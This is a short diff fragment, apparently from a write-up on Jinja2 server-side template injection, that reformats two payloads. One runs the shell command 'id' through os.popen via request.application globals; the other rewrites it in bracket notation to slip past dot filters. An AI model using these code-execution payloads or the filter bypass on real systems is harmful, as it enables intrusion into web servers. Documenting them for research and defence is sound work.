@@ -62,9 +62,12 @@ def login():
 - the research discussing the possibility of evading the dots filters by using the following approach :
 
 
-```C
+```
 {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
-# to
+```
+- to be
+
+```
 {{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
 ```
 
